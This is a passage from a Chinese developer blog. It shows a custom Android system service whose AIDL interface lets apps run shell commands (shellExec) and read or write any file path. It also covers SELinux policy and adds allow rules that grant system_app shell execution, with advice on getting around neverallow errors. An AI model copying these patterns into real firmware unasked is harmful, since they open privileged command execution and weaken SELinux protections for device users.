function_">writeTxtToFile</span><span class="params">(String strcontent, String filePath)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">strFilePath</span> <span class="operator">=</span> filePath;</span><br><span class="line">        <span class="type">String</span> <span class="variable">strContent</span> <span class="operator">=</span> strcontent + <span class="string">&quot;\n&quot;</span>;  <span class="comment">// \r\n 结尾会变成 ^M</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(strFilePath);</span><br><span class="line">            makeFilePath(file.getParent(),file.getName());</span><br><span class="line">            <span class="keyword">if</span> (!file.exists()) &#123;</span><br><span class="line">                file.getParentFile().mkdirs();</span><br><span class="line">                file.createNewFile();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">RandomAccessFile</span> <span class="variable">raf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RandomAccessFile</span>(file, <span class="string">&quot;rwd&quot;</span>);</span><br><span class="line">            raf.setLength(<span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">            <span class="comment">// 写文件的位置标记,从文件开头开始,后续读取文件内容从该标记开始</span></span><br><span class="line">            <span class="type">long</span> <span class="variable">writePosition</span> <span class="operator">=</span> raf.getFilePointer();</span><br><span class="line">            raf.seek(writePosition);</span><br><span class="line">            raf.write(strContent.getBytes());</span><br><span class="line">            raf.close();</span><br><span class="line">            <span class="comment">//</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            Log.d(<span class="string">&quot;DevicesService&quot;</span>,<span class="string">&quot;Error on write File:&quot;</span> + e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 生成文件</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> File <span class="title function_">makeFilePath</span><span class="params">(String filePath, String fileName)</span> &#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        makeRootDirectory(filePath);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            file = <span class="keyword">new</span> <span class="title class_">File</span>(filePath +<span class="string">&quot;/&quot;</span>+ fileName);</span><br><span class="line">            <span class="keyword">if</span> (!file.exists()) &#123;</span><br><span class="line">                file.createNewFile();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> file;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 生成文件夹</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">makeRootDirectory</span><span class="params">(String filePath)</span> &#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Log.d(<span class="string">&quot;FileHelper&quot;</span>, <span class="string">&quot;makeRootDirectory &quot;</span>+filePath);</span><br><span class="line">            file = <span class="keyword">new</span> <span class="title class_">File</span>(filePath);</span><br><span class="line">            <span class="keyword">if</span> (!file.exists()) &#123;</span><br><span class="line">                <span class="type">boolean</span> isok= file.mkdir();</span><br><span class="line">                Log.d(<span class="string">&quot;FileHelper&quot;</span>, <span class="string">&quot;makeRootDirectory &quot;</span>+filePath+<span class="string">&quot; &quot;</span>+isok);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            Log.d(<span class="string">&quot;DevicesService&quot;</span>, e+<span class="string">&quot;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">readFileAll</span><span class="params">(String path)</span> &#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(path);</span><br><span class="line">        StringBuilder sb=<span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">if</span> (file != <span class="literal">null</span> &amp;&amp; file.exists()) &#123;</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">bufferedReader</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                inputStream = <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line">                bufferedReader = <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(</span><br><span class="line">                        inputStream));</span><br><span class="line">                String outData;</span><br><span class="line">                <span class="keyword">while</span>((outData=bufferedReader.readLine())!=<span class="literal">null</span>)&#123;</span><br><span class="line">                    sb.append(outData+<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (bufferedReader != <span class="literal">null</span>) &#123;</span><br><span class="line">                        bufferedReader.close();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (inputStream != <span class="literal">null</span>) &#123;</span><br><span class="line">                        inputStream.close();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">readFile</span><span class="params">(String path)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> readFileAll(path);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">writeFile</span><span class="params">(String path,String data)</span>&#123;</span><br><span class="line">        writeTxtToFile(data,path);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="添加服务名称"><a href="#添加服务名称" class="headerlink" title="添加服务名称"></a>添加服务名称</h3><p><strong>frameworks/base/core/java/android/content/Context.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">        <span class="meta">@StringDef(suffix = &#123; &quot;_SERVICE&quot; &#125;, value = &#123;</span></span><br><span class="line"><span class="meta">                POWER_SERVICE,</span></span><br><span class="line"><span class="meta">/*add_longzhiye*/++    DEVICES_SERVICE,</span></span><br><span class="line"><span class="meta">                //@hide: POWER_STATS_SERVICE,</span></span><br><span class="line"><span class="meta">                WINDOW_SERVICE,</span></span><br><span class="line"><span class="meta">                LAYOUT_INFLATER_SERVICE,</span></span><br><span class="line"><span class="meta">                ACCOUNT_SERVICE,</span></span><br><span class="line"><span class="meta">                ACTIVITY_SERVICE,</span></span><br><span class="line"><span class="meta">                ALARM_SERVICE,</span></span><br><span class="line"><span class="meta"> </span></span><br><span class="line"><span class="meta"> </span></span><br><span class="line"><span class="meta"> </span></span><br><span class="line"><span class="meta">  public static final String POWER_SERVICE = &quot;power&quot;;</span></span><br><span class="line"><span class="meta">++public static final String DEVICES_SERVICE = &quot;devices&quot;;</span></span><br></pre></td></tr></table></figure><h3 id="将实现的服务注册到系统中去"><a href="#将实现的服务注册到系统中去" class="headerlink" title="将实现的服务注册到系统中去"></a>将实现的服务注册到系统中去</h3><p><strong>frameworks/base/core/java/android/app/SystemServiceRegistry.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">registerService(Context.SEARCH_SERVICE, SearchManager.class,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">CachedServiceFetcher</span>&lt;SearchManager&gt;() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> SearchManager <span class="title function_">createService</span><span class="params">(ContextImpl ctx)</span> <span class="keyword">throws</span> ServiceNotFoundException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">SearchManager</span>(ctx.getOuterContext(),</span><br><span class="line">                ctx.mMainThread.getHandler());</span><br><span class="line">    &#125;&#125;);</span><br><span class="line"><span class="comment">//add longzhiye</span></span><br><span class="line">registerService(Context.DEVICES_SERVICE,DevicesManager.class,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">CachedServiceFetcher</span>&lt;DevicesManager&gt;()&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> DevicesManager <span class="title function_">createService</span><span class="params">(ContextImpl ctx)</span>&#123;</span><br><span class="line">        <span class="type">IBinder</span> <span class="variable">b</span> <span class="operator">=</span> ServiceManager.getService(Context.DEVICES_SERVICE);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">DevicesManager</span>(ctx,IDevices.Stub.asInterface(b));</span><br><span class="line">                &#125; &#125;);   </span><br><span class="line"><span class="comment">//add end       </span></span><br><span class="line">registerService(Context.SENSOR_SERVICE, SensorManager.class,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">CachedServiceFetcher</span>&lt;SensorManager&gt;() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> SensorManager <span class="title function_">createService</span><span class="params">(ContextImpl ctx)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">SystemSensorManager</span>(ctx.getOuterContext(),</span><br><span class="line">          ctx.mMainThread.getHandler().getLooper());</span><br><span class="line">    &#125;&#125;);</span><br></pre></td></tr></table></figure><h3 id="将注册的服务设置成开机启动服务"><a href="#将注册的服务设置成开机启动服务" class="headerlink" title="将注册的服务设置成开机启动服务"></a>将注册的服务设置成开机启动服务</h3><p><strong>frameworks/base/services/java/com/android/server/SystemServer.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">t.traceBegin(<span class="string">&quot;StartTelephonyRegistry&quot;</span>);</span><br><span class="line">telephonyRegistry = <span class="keyword">new</span> <span class="title class_">TelephonyRegistry</span>(</span><br><span class="line">        context, <span class="keyword">new</span> <span class="title class_">TelephonyRegistry</span>.ConfigurationProvider());</span><br><span class="line">ServiceManager.addService(<span class="string">&quot;telephony.registry&quot;</span>, telephonyRegistry);</span><br><span class="line">t.traceEnd();</span><br><span class="line"><span class="comment">//add longzhiye</span></span><br><span class="line">t.traceBegin(<span class="string">&quot;StartDevicesService&quot;</span>);</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    ServiceManager.addService(Context.DEVICES_SERVICE,<span class="keyword">new</span> <span class="title class_">DevicesService</span>(context));</span><br><span class="line">&#125; <span class="keyword">catch</span>(Throwable e)&#123;</span><br><span class="line">    Slog.e(<span class="string">&quot;DevicesService&quot;</span>,<span class="string">&quot;Failed to start DevicesService Service &quot;</span>+e);</span><br><span class="line">&#125;</span><br><span class="line">t.traceEnd();</span><br><span class="line"><span class="comment">//add end</span></span><br></pre></td></tr></table></figure><h3 id="让lint检查忽略掉自己的模块"><a href="#让lint检查忽略掉自己的模块" class="headerlink" title="让lint检查忽略掉自己的模块"></a>让lint检查忽略掉自己的模块</h3><p>注(Android 11 以后谷歌强制开启lint检查，lint检查不过编译会报错)</p><p><strong>frameworks/base/Android.bp</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// TODO(b/145644363): move this to under StubLibraries.bp or ApiDocs.bp</span></span><br><span class="line">metalava_framework_docs_args = <span class="string">&quot;&quot;</span> +</span><br><span class="line">    <span class="string">&quot;--api-lint-ignore-prefix android.app. &quot;</span> +     <span class="comment">//add_longzhiye</span></span><br><span class="line">    <span class="string">&quot;--api-lint-ignore-prefix android.icu. &quot;</span> +</span><br><span class="line">    <span class="string">&quot;--api-lint-ignore-prefix java. &quot;</span> +</span><br><span class="line">    <span class="string">&quot;--api-lint-ignore-prefix junit. &quot;</span> +</span><br><span class="line">    <span class="string">&quot;--api-lint-ignore-prefix org. &quot;</span> +</span><br><span class="line">    <span class="string">&quot;--error NoSettingsProvider &quot;</span> +</span><br><span class="line">    <span class="string">&quot;--error UnhiddenSystemApi &quot;</span> +</span><br><span class="line">    <span class="string">&quot;--force-convert-to-warning-nullability-annotations +*:-android.*:+android.icu.*:-dalvik.* &quot;</span> +</span><br><span class="line">    <span class="string">&quot;--hide BroadcastBehavior &quot;</span> +</span><br><span class="line">    <span class="string">&quot;--hide CallbackInterface &quot;</span> +</span><br><span class="line">    <span class="string">&quot;--hide DeprecationMismatch &quot;</span> +</span><br><span class="line">    <span class="string">&quot;--hide HiddenSuperclass &quot;</span> +</span><br><span class="line">    <span class="string">&quot;--hide HiddenTypeParameter &quot;</span> +</span><br><span class="line">    <span class="string">&quot;--hide MissingPermission &quot;</span> +</span><br><span class="line">    <span class="string">&quot;--hide-package android.audio.policy.configuration.V7_0 &quot;</span> +</span><br><span class="line">    <span class="string">&quot;--hide-package com.android.server &quot;</span> +</span><br><span class="line">    <span class="string">&quot;--hide RequiresPermission &quot;</span> +</span><br><span class="line">    <span class="string">&quot;--hide SdkConstant &quot;</span> +</span><br><span class="line">    <span class="string">&quot;--hide Todo &quot;</span> +</span><br><span class="line">    <span class="string">&quot;--hide Typo &quot;</span> +</span><br><span class="line">    <span class="string">&quot;--hide UnavailableSymbol &quot;</span> +</span><br><span class="line">    <span class="string">&quot;--manifest $(location core/res/AndroidManifest.xml) &quot;</span></span><br></pre></td></tr></table></figure><h3 id="编译源码-更新api接口"><a href="#编译源码-更新api接口" class="headerlink" title="编译源码 更新api接口"></a>编译源码 更新api接口</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make update-api</span><br></pre></td></tr></table></figure><h3 id="检查服务是否开启"><a href="#检查服务是否开启" class="headerlink" title="检查服务是否开启"></a>检查服务是否开启</h3><p>将编译好的rom 刷入手机,查看sevice list<br>这里可以看到我们的服务 已经启动了：<br>服务名称：79 devices: [android.app.IDevices]</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">longzhiye@longzhiye-laptop:~$ adb shell</span><br><span class="line">coral:/ <span class="comment"># service list |grep Device</span></span><br><span class="line">60    companiondevice: [android.companion.ICompanionDeviceManager]</span><br><span class="line">75    device_identifiers: [android.os.IDeviceIdentifiersPolicyService]</span><br><span class="line">76    device_policy: [android.app.admin.IDevicePolicyManager]</span><br><span class="line">77    device_state: [android.hardware.devicestate.IDeviceStateManager]</span><br><span class="line">78    deviceidle: [android.os.IDeviceIdleController]</span><br><span class="line">79    devices: [android.app.IDevices]</span><br><span class="line">251    virtualdevice: [android.companion.virtual.IVirtualDeviceManager]</span><br><span class="line">coral:/ <span class="comment">#</span></span><br></pre></td></tr></table></figure><h3 id="调用测试"><a href="#调用测试" class="headerlink" title="调用测试"></a>调用测试</h3><p>应用层项目中引入aidl</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// IDevices.aidl</span></span><br><span class="line"><span class="keyword">package</span> android.app;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// Declare any non-default types here with import statements</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">IDevices</span> &#123;</span><br><span class="line">        String <span class="title function_">shellExec</span><span class="params">(String cmd)</span>;</span><br><span class="line">        String <span class="title function_">readFile</span><span class="params">(String path)</span>;</span><br><span class="line">        <span class="keyword">void</span> <span class="title function_">writeFile</span><span class="params">(String path,String data)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/20231104/20231104001.jpg"><br>调用测试：<br><img src="/images/20231104/20231104002.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> Framework </tag>
            
            <tag> AndroidStudio </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android系统SELinux详解</title>
      <link href="/2023/10/29/2023-10-29/"/>
      <url>/2023/10/29/2023-10-29/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>SELinux是一种加强文件安全的一种策略，可以更好地保护我们的Android系统， 比如限制系统服务的访问权限、控制应用对数据和系统日志的访问等措施，这样就降低了恶意软件的影响，并且可以防止因代码存在的缺陷而产生的对系统安全的影响。</p><p>从系统安全方面考虑，SELinux是保护神，但是从软件开发方面，SELinux就是一道牵绊，这是一把双刃剑。SELinux默认开启，即使获得了该系统的root权限，也只能向相关策略中指定的设备写入数据，从而更好地保护和限制系统服务，保障系统和数据的安全。</p><p><img src="/images/20231029/20231029001.png"></p><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>硬件平台：Google Pixel2<br>操作系统：Android10.0</p><h3 id="selinux有两种工作模式"><a href="#selinux有两种工作模式" class="headerlink" title="selinux有两种工作模式"></a>selinux有两种工作模式</h3><table><thead><tr><th>名称</th><th>作用</th></tr></thead><tbody><tr><td>permissive</td><td>所有操作都被允许（即没有MAC），但是如果有违反权限的话，会记录日志</td></tr><tr><td>enforcing</td><td>所有操作都会进行权限检查</td></tr></tbody></table><h3 id="标签、规则和域"><a href="#标签、规则和域" class="headerlink" title="标签、规则和域"></a>标签、规则和域</h3><p>SELinux 依靠标签来匹配操作和策略。标签用于决定允许的事项。套接字、文件和进程在 SELinux 中都有标签。SELinux 在做决定时需参照两点：一是为这些对象分配的标签，二是定义这些对象如何交互的策略。</p><p>在 SELinux 中，标签采用以下形式：user:role:type:mls_level，其中 type 是访问决定的主要组成部分，可通过构成标签的其他组成部分进行修改。对象会映射到类，对每个类的不同访问类型由权限表示。</p><p>策略规则采用以下形式：allow domains types:classes permissions;，其中：</p><table><thead><tr><th>名称</th><th>作用</th></tr></thead><tbody><tr><td>domain</td><td>一个进程或一组进程的标签。也称为域类型，因为它只是指进程的类型。</td></tr><tr><td>type</td><td>一个对象（例如，文件、套接字）或一组对象的标签。</td></tr><tr><td>class</td><td>要访问的对象（例如，文件、套接字）的类型。Permission - 要执行的操作（例如，读取、写入）。</td></tr></tbody></table><h3 id="策略配置源文件"><a href="#策略配置源文件" class="headerlink" title="策略配置源文件"></a>策略配置源文件</h3><ol><li>external/sepolicy<br>这是独立于设备的配置，一般不能针对设备进行修改</li><li>device///sepolicy<br>这是特定于设备的配置，基于 BOARD_SEPOLICY_* 变量来选择对应平台的策略配置。</li></ol><h3 id="Type-Enforcement-TE-配置文件"><a href="#Type-Enforcement-TE-配置文件" class="headerlink" title="Type Enforcement (TE) 配置文件"></a>Type Enforcement (TE) 配置文件</h3><p>.te 文件中保存了对应对象的域和类型定义、规则。通常每个域一个 .te 文件，例如installd.te。在 device.te、file.te 中声明了设备和文件类型。在某些文件（例如domain.te、app.te）中则存储着共享规则。</p><h3 id="标签配置文件"><a href="#标签配置文件" class="headerlink" title="标签配置文件"></a>标签配置文件</h3><ol><li>file_contexts：文件安全上下文</li><li>property_contexts：属性安全上下文</li></ol><h4 id="SEAndroid-app分类"><a href="#SEAndroid-app分类" class="headerlink" title="SEAndroid app分类"></a>SEAndroid app分类</h4><p>SELinux(或SEAndroid)将app划分为主要三种类型(根据user不同，也有其他的domain类型)：</p><table><thead><tr><th>名称</th><th>作用</th></tr></thead><tbody><tr><td>untrusted_app</td><td>第三方app，没有Android平台签名，没有system权限</td></tr><tr><td>platform_app</td><td>有android平台签名，没有system权限</td></tr><tr><td>system_app</td><td>有android平台签名和system权限</td></tr></tbody></table><p>从上面划分，权限等级，理论上：untrusted_app &lt; platform_app &lt; system_app</p><h3 id="user"><a href="#user" class="headerlink" title="user"></a>user</h3><p>user可以理解为UID。android的UID和linux的UID根本是两回事，Linux的UID是用于针对多用户操作系统中用于区分用户的，而Android中的UID是用于系统进行权限管理的。参考链接中的文章对于uid的产生讲的很清楚。</p><h3 id="seinfo"><a href="#seinfo" class="headerlink" title="seinfo"></a>seinfo</h3><p>不同签名会创建对应的selinux上下文。<br>Android.mk<br><strong>LOCAL_CERTIFICATE := platform</strong><br>有platform签名，所以seinfo是platform。</p><h3 id="自定义安全策略"><a href="#自定义安全策略" class="headerlink" title="自定义安全策略"></a>自定义安全策略</h3><p>以上面两个运行的app来说，我们为这两个APP添加额外的权限，对应的TE配置文件分别就是system_app.te、untrusted_app.te，对应路径为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$aosp/system/sepolicy/public/system_app.te</span><br><span class="line">$aosp/system/sepolicy/public/untrusted_app.te</span><br></pre></td></tr></table></figure><p>以longzhiye.example.app为例，我们为其添加can设备的执行权限：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">longzhiye@longzhiye-laptop:~/mount/project/androidq$ vi system/sepolicy/public/system_app.te</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line">allow system_app vendor_shell_exec:file &#123; getattr open read execute execute_no_trans &#125;;</span><br><span class="line">allow system_app shell_exec:file &#123; getattr open read execute execute_no_trans &#125;;</span><br><span class="line">allow system_app shell:file &#123; getattr open read execute execute_no_trans &#125;;</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>以策略规则配置形式（allow domains types:classes permissions）</p><p>分析：</p><table><thead><tr><th>策略规则</th><th>示例</th></tr></thead><tbody><tr><td>domains</td><td>system_app</td></tr><tr><td>types</td><td>vendor_shell_exec</td></tr><tr><td>classes</td><td>file</td></tr><tr><td>permissions</td><td>getattr open read execute execute_no_trans</td></tr></tbody></table><h3 id="neverallow-failures"><a href="#neverallow-failures" class="headerlink" title="neverallow failures"></a>neverallow failures</h3><p>有时我们增加的权限，系统默认的配置是不允许的，比如我们上面给forlinx.example.app增加的执行脚本的权限，报错如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">libsepol.report_failure: neverallow on line 9 of system/sepolicy/private/system_app.te</span><br><span class="line"></span><br><span class="line">(or line 41463 of policy.conf) violated by allow system_app shell:file &#123; read open &#125;;</span><br><span class="line"></span><br><span class="line">libsepol.report_failure: neverallow on line 22 of system/sepolicy/private/shell.te</span><br><span class="line"></span><br><span class="line">(or line 40025 of policy.conf) violated by allow system_app shell:file &#123; read open &#125;;</span><br><span class="line"></span><br><span class="line">libsepol.check_assertions: 2 neverallow failures occurred</span><br></pre></td></tr></table></figure><p>系统默认的安全策略的路径为system/sepolicy/，根据报错的提示，我们可以修改默认的配置，修改system/sepolicy/private/system_app.te和system/sepolicy/private/shell.te，从而完成权限的赋予。</p><h3 id="安卓中快速编译sepolicy并验证-需要本地代码整编过一次，已经生成out目录"><a href="#安卓中快速编译sepolicy并验证-需要本地代码整编过一次，已经生成out目录" class="headerlink" title="安卓中快速编译sepolicy并验证(需要本地代码整编过一次，已经生成out目录)"></a>安卓中快速编译sepolicy并验证(需要本地代码整编过一次，已经生成out目录)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ mmm system/sepolicy/</span><br><span class="line">$ adb push out/target/product/xxx/system/etc/selinux /system/etc/selinux</span><br><span class="line">$ adb push out/target/product/xxx/vendor/etc/selinux /vendor/etc/selinux</span><br></pre></td></tr></table></figure><p>也可单编systemimage，并刷机</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ make systemimage</span><br><span class="line">$ adb reboot bootloader</span><br><span class="line">$ fastboot flash system ./system.img</span><br><span class="line">$ fastboot reboot</span><br></pre></td></tr></table></figure><h3 id="如何应对neverallow-绕过CTS认证"><a href="#如何应对neverallow-绕过CTS认证" class="headerlink" title="如何应对neverallow? 绕过CTS认证"></a>如何应对neverallow? 绕过CTS认证</h3><p>在system/sepolicy/private/logpersist.te与system/sepolicy/prebuilts/api/29.0/private/logpersist.te中配置以下allow语句并编译，<br>会报neverallow的错。如下声明allow:<br>allow  logpersist  system_data_file:dir  write;<br>这表示谷歌不允许我们使用allow语句，解除限制的最暴力方法就是将报错处的neverallow语句删掉，这样确实可行，但是会过不了cts。<br>由于我们要访问的目录path为/data/syslog，将该目录定义成自己的Type，可以自定义Type，如下：<br>在file.te中自定义一个type为file_type，data_file_type，core_data_file_type：<br>（1）type log_data_file, file_type, data_file_type, core_data_file_type;<br>在file_contexts中定义安全上下文：<br>（2）/data/syslog(/.*)?            u:object_r:log_data_file:s0<br>在logpersist.te将allow语句改为：<br>（3）allow  logpersist  log_data_file write;<br>然后在logpersist.te中单独将自定义的log_data_file减去即可。(这里最好的是自定义一个service代替logpersist，那就要新建一个te文件了，比较麻烦)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">neverallow logpersist &#123;</span><br><span class="line">  file_type</span><br><span class="line">  userdebug_or_eng(`-misc_logd_file -coredump_file<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">  with_native_coverage(`-method_trace_data_file&#x27;</span>)</span><br><span class="line">  -log_data_file</span><br><span class="line">&#125;:file &#123; create write append &#125;;</span><br></pre></td></tr></table></figure><h3 id="如何新增domian域？（一般在平台相关目录下添加）"><a href="#如何新增domian域？（一般在平台相关目录下添加）" class="headerlink" title="如何新增domian域？（一般在平台相关目录下添加）"></a>如何新增domian域？（一般在平台相关目录下添加）</h3><p>例子如下<br>在device/平台名/system/private/file_contexts 文件添加</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># tcontext=u:object_r:sysfs:s0</span></span><br></pre></td></tr></table></figure><p>/sys/kernel/display/abcd u:object_r:wxl_abcd:s0 #wxl_abcd替换sysfs，wxl_abcd随便取</p><p>在device/平台名/system/public/file.te 中添加</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type wxl_cabc, 